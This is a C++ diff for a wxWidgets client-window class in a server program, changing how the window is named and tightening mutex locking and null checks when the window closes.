@@ -5,12 +5,12 @@
 extern Servidor* p_Servidor;
 extern std::mutex vector_mutex;
 
-FrameCliente::FrameCliente(std::string strID, int iID)
-    : wxFrame(nullptr, iID, ":v")
+FrameCliente::FrameCliente(std::string strID, wxString nameID)
+    : wxFrame(nullptr, wxID_ANY, ":v", wxDefaultPosition, wxDefaultSize, wxDD_DEFAULT_STYLE, nameID)
 {
 
-    std::vector<std::string> vcOut = strSplit(strID, '/', 1);
-    this->strClienteID = vcOut[0];
+    //std::vector<std::string> vcOut = strSplit(strID, '/', 1);
+    this->strClienteID = nameID;
 
     std::unique_lock<std::mutex> lock(vector_mutex);
     for (auto iter = p_Servidor->vc_Clientes.begin(); iter != p_Servidor->vc_Clientes.end();) {
@@ -91,9 +91,10 @@ Me pueden detener a mí, pero no nos pueden detenernos a todos, al fin y al cabo 
 void FrameCliente::OnTest(wxCommandEvent& event) {
     std::vector<struct Cliente> vc_Copy;
     std::unique_lock<std::mutex> lock(vector_mutex);
+    
     vc_Copy = p_Servidor->vc_Clientes;
     lock.unlock();
-
+    
     for (auto aClient : vc_Copy) {
         if (aClient._id == this->strClienteID) {
             int ib = p_Servidor->cSend(aClient._sckCliente, "CUSTOM_TEST~0", 13, 0, false);
@@ -104,15 +105,19 @@ void FrameCliente::OnTest(wxCommandEvent& event) {
 }
 
 void FrameCliente::OnClose(wxCloseEvent& event) {
-    std::lock_guard<std::mutex> lock(vector_mutex);
-    for (auto iter = p_Servidor->vc_Clientes.begin(); iter != p_Servidor->vc_Clientes.end();) {
-        if (iter->_id == this->strClienteID) {
-            iter->_isBusy = false;
-            iter->_ttUltimaVez = time(0);
-            break;
+    std::unique_lock<std::mutex> lock(vector_mutex);
+    
+    if (p_Servidor) {
+        for (auto iter = p_Servidor->vc_Clientes.begin(); iter != p_Servidor->vc_Clientes.end();) {
+            if (iter->_id == this->strClienteID) {
+                iter->_isBusy = false;
+                iter->_ttUltimaVez = time(0);
+                break;
+            }
+            ++iter;
         }
-        ++iter;
     }
+    lock.unlock();
 
     event.Skip();
 }
